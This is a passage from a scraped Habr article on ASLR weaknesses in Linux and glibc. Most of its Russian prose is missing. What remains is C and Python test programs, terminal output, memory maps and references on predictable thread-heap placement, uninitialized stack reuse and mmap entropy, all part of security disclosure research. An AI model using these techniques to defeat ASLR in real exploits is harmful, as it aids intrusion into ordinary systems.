class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">pthread_t</span></span> one; pthread_create(&amp;one, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;first, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *val; pthread_join(one,&amp;val); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p>   : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./thread_stack_small_heap &lt;b&gt;fffffffff844e98c&lt;<span class="hljs-regexp"><span class="hljs-regexp">/b&gt; 0x7f20480008c0, 0x7f204fbb1f34</span></span></code> </pre> <br><p>    : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests</span></span>$ ./thread_stack_small_heap &lt;b&gt;fffffffff94a598c&lt;<span class="hljs-regexp"><span class="hljs-regexp">/b&gt; 0x7fa3140008c0, 0x7fa31ab5af34</span></span></code> </pre> <br><p>      .        .  , . </p><br><p> ,   :  ,  malloc,     [heap] . </p><br><p> glibc         <i>pthread_create</i> .       TLS ,       ¬´¬ª ,     :         malloc. </p><br><p>    ¬´¬ª? </p><br><p> glibc      mmap,     .       64 .        64 .    128 ,       64 ,    ,  ¬´¬ª       ,     <i>mmap</i> . </p><br><p>         <i>mmap_based</i> :      64 ,      <i>mmap</i> ,     <i>malloc</i> . </p><br><p>       ,       ‚Äî   . </p><br><p> ,      x86-64    Linux  ¬´47bits minus one guard page¬ª,     2^47 (              ). <br> 64   2^26,     47 ‚Äì 26 = 21.      2^21    . </p><br><p>       . </p><br><p>   <i>mmap</i>     ,    ,   <i>pthread_create</i> ,    64 ,     .  ,     ,    . . </p><br><p>             <i>malloc</i> .      glibc, ld     .    . </p><br><p>   6  ,    <i>mmap_base</i> ,     : <i>mmap_base</i>     28  32         (  28 ).        . </p><br><p>  ,      7    0x7f     0x7e.     7  .   2^14       .    ,          . </p><br><p>       C: </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> * </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">first</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *x)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> a = (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)x; <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *ptr; ptr = <span class="hljs-built_in"><span class="hljs-built_in">malloc</span></span>(<span class="hljs-number"><span class="hljs-number">8</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"%p\n"</span></span>, ptr ); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">pthread_t</span></span> one; pthread_create(&amp;one, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;first, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *val; pthread_join(one,&amp;val); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p>       ,   ,   Python: </p><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> subprocess d = {} <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dump</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(iteration, hysto)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'Iteration %d len %d'</span></span>%(iteration, len(hysto)) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> key <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> sorted(hysto): <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> hex(key), hysto[key] i = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> i &lt; <span class="hljs-number"><span class="hljs-number">1000000</span></span>: out = subprocess.check_output([<span class="hljs-string"><span class="hljs-string">'./t'</span></span>]) addr = int(out, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-comment"><span class="hljs-comment">#omit page size addr &gt;&gt;= 12 if addr in d: d[addr] += 1 else: d[addr] = 1 i += 1 dump(i,d)</span></span></code> </pre> <br><p>         './t',    ,       malloc     .     ,    ,        .     16 385  ,   2^14+1.          ,      . </p><br><p>    ¬´    ,    <i>malloc</i> ¬ª,        .  :        mmap   ,    , ‚Äî         . </p><br><h3> 5.8      </h3><br><p>             <i>malloc</i> .      ,    <i>malloc</i> .       0xdeadbeef.     ,     malloc.     .    .  Source: </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> * </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">func</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *x)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> a[<span class="hljs-number"><span class="hljs-number">1024</span></span>]; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"addr: %p\n"</span></span>, &amp;a[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (x) <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"value %lx\n"</span></span>, a[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { a[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0xdeadbeef</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"value %lx\n"</span></span>, a[<span class="hljs-number"><span class="hljs-number">0</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> * addr = <span class="hljs-built_in"><span class="hljs-built_in">malloc</span></span>(<span class="hljs-number"><span class="hljs-number">32</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"malloced %p\n"</span></span>, addr); <span class="hljs-built_in"><span class="hljs-built_in">free</span></span>(addr); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> argc, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> **argv, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> **envp)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> val; <span class="hljs-keyword"><span class="hljs-keyword">pthread_t</span></span> thread; pthread_create(&amp;thread, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, func, <span class="hljs-number"><span class="hljs-number">0</span></span>); pthread_join(thread, &amp;val); pthread_create(&amp;thread, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, func, <span class="hljs-number"><span class="hljs-number">1</span></span>); pthread_join(thread, &amp;val); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><p>   : </p><br><pre> <code class="hljs xml">blackzert@crasher:~/aslur/tests$ ./pthread_cache addr: <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>0x7fd035e04f40<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span> value <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>deadbeef<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span> malloced <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>0x7fd030000cd0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span> addr: <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>0x7fd035e04f40<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span> value <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>deadbeef malloced <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>0x7fd030000cd0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>   ,        ,    ,  .      ,      malloc.            .          (26).      ,        ASLR. </p><br><ol><li>      </li></ol><br><p>    ,        : </p><br><ol><li>   ¬´execve¬ª     . </li><li>    vma,    ( <i>stack_base</i> ).      2^47 ‚Äì <i>pagesize</i> ( pagesize ‚Äî  ,   x86-64  4096),        <i>random1</i> ,   16  (   ,     ,    :       ,        ). </li><li>   <i>mmap_base</i> ‚Äî ,           .     <i>stack_base</i> ‚Äì <i>random2</i> ‚Äì 128 ,  random2  ,            1   16 . </li><li>      .    PIE (     ),     (2^47 ‚Äì 1) * 2/3 + random3,    <i>random3</i>          1   16 . </li><li>       ,    -,           .      ELF-  ld  glibc.    <i>mmap_base</i> . </li><li>         ELF-    <i>random4</i>     32 . </li></ol><br><p>    ,  ,          ELF-  (ld),    ELF- ,    ( ¬´¬ª ELF). </p><br><p>    ASLR                </p><br><img src="https://habrastorage.org/webt/rj/ah/ja/rjahjavtcjjjmubedti70yaw5ne.png"><br><p>  ,   ,  ,       .           ( ),   . </p><br><p>             ,            ASLR.      ,     ,          . </p><br><p>        ,     <i>mmap</i> -    ()    <i>mmap</i> -: </p><br><ul><li>        <i>mmap</i> -,          ( 4.3),     <i>mmap_base</i>         <i>mmap</i> -. </li><li>       mmap-     ‚Äî  -     . </li></ul><br><p>           Python,       .      ELF-    .   ,    ,    <i>/proc:</i>    ld (   mmap_base)     ,  .     .       .     <a href="https://github.com/blackzert/aslur">https://github.com/blackzert/aslur</a> </p><br><p> 6.1   </p><br><p>   ,    -  . </p><br><ol><li>     .          glibc     .        ‚Äî         ,      ,  .            .     : </li></ol><br><ul><li>    ()            ,   <i>pthread_create</i> ,         ()   ,     . </li><li>    ()              ,        vtable   libc.main_arena.   libc.main_arena      glibc   mmap_base.   vtable       (  mmap_base),    .     ,       .got.plt,      . </li></ul><br><ol><li>  : <br><ul><li>        ¬´¬ª; </li><li>     ,    1; </li><li>   mmap         . </li></ul></li></ol><br><h2> 7.  </h2><br><p>      ,      .         . </p><br><h3> 7.1   ld.so </h3><br><p>      4.4,  ELF-   Linux         .     ,     : <br> <a href="https://lkml.org/lkml/2017/7/14/290">https://lkml.org/lkml/2017/7/14/290</a> </p><br><h3> 7.2    ELF- </h3><br><p>   ,        glibc   ELF-  ‚Äî    ,      . PoC   ,    <a href="https://github.com/blackzert/aslur">https://github.com/blackzert/aslur</a> </p><br><p>   :      ,           <i>vaddr</i> . </p><br><h3> 7.3  mmap_min_addr     mmap </h3><br><p>       <i>mmap</i> ,      ,  :   <i>mmap</i>      .   ¬´¬ª,        execve. </p><br><p>     (    3)   ¬´   ,   ¬ª.      ,     mmap_min_addr.         sysctl.      ,           .      65536. </p><br><p>    ,        mmap   x86-64 Linux       4096,    mmap_min_addr.   cap_mmap_addr  ,      4096  mmap_min_addr. </p><br><p> cap_mmap_addr  :    ¬´¬ª   .     :    ,       -  ,            .      ,    ,    ,    ¬´¬ª       EPERM. </p><br><p>            :       ,         .          ,      ‚Äî      EPERM    . </p><br><p>           mmap_min_addr           .         . </p><br><p>   ,  ,          ,   ‚Äî          EPERM,                 .    mmap  : </p><br><p> ‚Äù EPERM The operation was prevented by a file seal; see fcntl(2).‚Äù <br>       EPERM  MAP_ANONYMOUS,      . </p><br><h3> 7.4 mmap </h3><br><p>    mmap ‚Äî     .  ,  , ‚Äî   .   ,       ,   .             ,    ‚Äî         . </p><br><p>         : </p><br><ol><li>        .          ,          ()         . </li><li>       ,         ,   ,      .        ()  ,  ,   ,          .               <i>vma</i>    . </li><li>     -  <i>vma</i>      <i>gap</i>    .          ,        . </li></ol><br><p>     ‚Äî     <i>vma</i>         : </p><br><ol><li>        gap,    .    <i>vma</i> ,   .   ,  <b>ENOMEM</b> . </li><li>  gap   ,  <i>vma</i> ‚Äî    . </li><li>    <i>vma</i>   .     - ,     . </li><li>       <i>vma</i> ,       <i>vma</i>   .      ,    .     1,      gap. </li><li>        gap. </li></ol><br><p>      4     ,   gap    . </p><br><p>        ,      . </p><br><p>         <i>vma</i> ,     gap.           . </p><br><h2> 8.    ASLR </h2><br><p>        /bin/less   : </p><br><pre> <code class="hljs pgsql"><span class="hljs-number"><span class="hljs-number">314</span></span>a2d0da000<span class="hljs-number"><span class="hljs-number">-314</span></span>a2d101000 r-xp /lib/x86_64-linux-gnu/ld<span class="hljs-number"><span class="hljs-number">-2.26</span></span>.so <span class="hljs-number"><span class="hljs-number">314</span></span>a2d301000<span class="hljs-number"><span class="hljs-number">-314</span></span>a2d302000 r<span class="hljs-comment"><span class="hljs-comment">--p /lib/x86_64-linux-gnu/ld-2.26.so 314a2d302000-314a2d303000 rw-p /lib/x86_64-linux-gnu/ld-2.26.so 314a2d303000-314a2d304000 rw-p 3169afcd8000-3169afcdb000 rw-p 316a94aa1000-316a94ac6000 r-xp /lib/x86_64-linux-gnu/libtinfo.so.5.9 316a94ac6000-316a94cc5000 ---p /lib/x86_64-linux-gnu/libtinfo.so.5.9 316a94cc5000-316a94cc9000 r--p /lib/x86_64-linux-gnu/libtinfo.so.5.9 316a94cc9000-316a94cca000 rw-p /lib/x86_64-linux-gnu/libtinfo.so.5.9 3204e362d000-3204e3630000 rw-p 4477fff2c000-447800102000 r-xp /lib/x86_64-linux-gnu/libc-2.26.so 447800102000-447800302000 ---p /lib/x86_64-linux-gnu/libc-2.26.so 447800302000-447800306000 r--p /lib/x86_64-linux-gnu/libc-2.26.so 447800306000-447800308000 rw-p /lib/x86_64-linux-gnu/libc-2.26.so 447800308000-44780030c000 rw-p 509000396000-509000d60000 r--p /usr/lib/locale/locale-archive 56011c1b1000-56011c1d7000 r-xp /bin/less 56011c3d6000-56011c3d7000 r--p /bin/less 56011c3d7000-56011c3db000 rw-p /bin/less 56011c3db000-56011c3df000 rw-p 56011e0d8000-56011e0f9000 rw-p [heap] 7fff6b4a4000-7fff6b4c5000 rw-p [stack] 7fff6b53b000-7fff6b53e000 r--p [vvar] 7fff6b53e000-7fff6b540000 r-xp [vdso] ffffffffff600000-ffffffffff601000 r-xp [vsyscall]</span></span></code> </pre> <br><p>   : </p><br><ol><li>      ,       . </li><li>  ¬´/usr/lib/locale/locale-archive¬ª,    mmap,     . </li><li> ¬´¬ª  /lib/x86_64-linux-gnu/ld-2.26.so      mmap. </li></ol><br><p>       Ubuntu 17.04    Chrome  Mozilla Firefox.     . </p><br><h2> 9.  </h2><br><p>             glibc    .        .    : </p><br><ul><li>    <i>mmap</i>   . </li><li>  ELF-        . </li><li>     <i>do_mmap</i>     <i>mmap_min_addr</i>   x86-64. </li><li>  ELF-     ¬´¬ª  ELF-    ELF-. </li><li>  ELF-  GNU Libc ld,  <i>mmap</i>     ,      <i>mmap_base</i> .       . </li><li>  GNU Libc,  mmap   ,   TLS ,       <i>mmap_base</i> . </li><li>  GNU Libc  TLS ,  c  <i>pthread_create</i> ,   ,         ,  ¬´¬ª. </li><li>  GNU Libc     () ,          . </li><li>  GNU Libc     ,   2^26,    . </li></ul><br><p>       ASLR         .            . </p><br><p>      PoC.     ,    .        ASLR    ,  Windows  Mac OS X. </p><br><p>      GNU Libc,         . </p><br><p>         ASLR    ,   Windows, Mac OS X  Android. </p><br><p> :  . </p><br><h3>  Links </h3><br><ol><li> Erik Buchanan, Ryan Roemer, Stefan Savage, Hovav Shacham. Return-Oriented Programming: Exploits Without Code Injection. [Online] Aug 2008. <a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf">https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf</a> . </li><li> xorl. [Online] <a href="https://xorl.wordpress.com/2011/01/16/linux-kernel-aslr-implementation/">https://xorl.wordpress.com/2011/01/16/linux-kernel-aslr-implementation/</a> . </li><li> Reed Hastings, Bob Joyce. Purify: Fast Detection of Memory Leaks and Access Errors. [ ] December 1992 . <a href="https://web.stanford.edu/class/cs343/resources/purify.pdf">https://web.stanford.edu/class/cs343/resources/purify.pdf</a> . </li><li> Improper Restriction of Operations within the Bounds of a Memory Buffer. [ ] <a href="https://cwe.mitre.org/data/definitions/119.html">https://cwe.mitre.org/data/definitions/119.html</a> . </li><li> AMD Bulldozer Linux ASLR weakness: Reducing entropy by 87.5%. [ ] <a href="http://hmarco.org/bugs/AMD-Bulldozer-linux-ASLR-weakness-reducing-mmaped-files-by-eight.html">http://hmarco.org/bugs/AMD-Bulldozer-linux-ASLR-weakness-reducing-mmaped-files-by-eight.html</a> . </li><li> Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu-Ghazaleh. Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR. [ ] <a href="http://www.cs.ucr.edu/~nael/pubs/micro16.pdf">http://www.cs.ucr.edu/~nael/pubs/micro16.pdf</a> . </li><li> Hector Marco-Gisbert, Ismael Ripoll. Offset2lib: bypassing full ASLR on 64bit Linux. [ ] <a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html">https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html</a> . </li><li> Hector Marco-Gisbert, Ismael Ripoll-Ripoll. ASLR-NG: ASLR Next Generation. [ ] 2016 . <a href="https://cybersecurity.upv.es/solutions/aslr-ng/ASLRNG-BH-white-paper.pdf">https://cybersecurity.upv.es/solutions/aslr-ng/ASLRNG-BH-white-paper.pdf</a> . </li><li> Doubly linked list. [ ] <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">https://en.wikipedia.org/wiki/Doubly_linked_list</a> . </li><li> Bayer, Rudolf. Symmetric binary B-Trees: Data structure and maintenance algorithms. [ ] 24 January 1972 . <a href="https://link.springer.com/article/10.1007%252FBF00289509">https://link.springer.com/article/10.1007%2FBF00289509</a> . </li><li> Lespinasse, Michel. mm: use augmented rbtrees for finding unmapped areas. [ ] 5 November 2012 . <a href="https://lkml.org/lkml/2012/11/5/673">https://lkml.org/lkml/2012/11/5/673</a> . </li><li> Integer Overflow or Wraparound. [ ] <a href="https://cwe.mitre.org/data/definitions/190.html">https://cwe.mitre.org/data/definitions/190.html</a> . </li><li> Classic Buffer Overflow. [ ] <a href="https://cwe.mitre.org/data/definitions/120.html">https://cwe.mitre.org/data/definitions/120.html</a> . </li><li> Incorrect Type Conversion or Cast. [ ] <a href="https://cwe.mitre.org/data/definitions/704.html">https://cwe.mitre.org/data/definitions/704.html</a> . </li><li> CVE-2014-9427. [ ] <a href="https://www.cvedetails.com/cve/CVE-2014-9427/">https://www.cvedetails.com/cve/CVE-2014-9427/</a> . </li><li> Security Enhancements in Android 7.0. [ ] <a href="https://source.android.com/security/enhancements/enhancements70">https://source.android.com/security/enhancements/enhancements70</a> . </li><li> Implement Library Load Order Randomization. [ ] <a href="https://android-review.googlesource.com/c/platform/bionic/%2B/178130/2">https://android-review.googlesource.com/c/platform/bionic/+/178130/2</a> . </li><li> Thread-Local Storage. [ ] <a href="http://gcc.gnu.org/onlinedocs/gcc-3.3/gcc/Thread-Local.html">http://gcc.gnu.org/onlinedocs/gcc-3.3/gcc/Thread-Local.html</a> . </li><li> One, Aleph. Smashing The Stack For Fun And Profit. [ ] <a href="http://www.phrack.org/issues/49/14.html">http://www.phrack.org/issues/49/14.html#article</a> . </li><li> Fritsch, Hagen. Buffer overflows on linux-x86-64. [ ] 16 April 2009 . <a href="http://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Buffer-Overflows-Linux-whitepaper.pdf">http://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Buffer-Overflows-Linux-whitepaper.pdf</a> . </li><li> Litchfield, David. Defeating the Stack Based Buffer Overflow Prevention. [ ] 8 September 2003 . <a href="https://crypto.stanford.edu/cs155old/cs155-spring05/litch.pdf">https://crypto.stanford.edu/cs155old/cs155-spring05/litch.pdf</a> . </li><li> Maxim Goryachy, Mark Ermolov. HOW TO HACK A TURNED-OFF COMPUTER, OR RUNNING. [ ] <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf</a> . </li><li> Use After Free. [ ] <a href="https://cwe.mitre.org/data/definitions/416.html">https://cwe.mitre.org/data/definitions/416.html</a> . </li><li> [ ] <a href="http://www.skyfree.org/linux/references/ELF_Format.pdf">http://www.skyfree.org/linux/references/ELF_Format.pdf</a> . </li><li> Hocko, Michal. mm: introduce MAP_FIXED_SAFE. [ ] <a href="https://lwn.net/Articles/741335/">https://lwn.net/Articles/741335/</a> . </li><li> Use of Uninitialized Variable. [ ] <a href="https://cwe.mitre.org/data/definitions/457.html">https://cwe.mitre.org/data/definitions/457.html</a> . </li></ol></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/349544/">https://habr.com/ru/post/349544/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../349528/index.html">Telegram-bot "Easy Win" - check the history of the car by VIN or state. number</a></li>
<li><a href="../349530/index.html">How to better understand people</a></li>
<li><a href="../349532/index.html">Html page through the eyes of an application developer. Part 2: "Implementation"</a></li>
<li><a href="../349538/index.html">More Free Feedback on Freelance - More Money</a></li>
<li><a href="../349542/index.html">How to use gamification in analytics</a></li>
<li><a href="../349546/index.html">Games in which you need to write code (part 2)</a></li>
<li><a href="../349548/index.html">Remote work robots: technical details and application</a></li>
<li><a href="../349550/index.html">Quantum computing in the Fujitsu Digital Annealer computer</a></li>
<li><a href="../349554/index.html">10 main secrets of productivity Ilona Mask</a></li>
<li><a href="../349556/index.html">Nextcloud talk</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>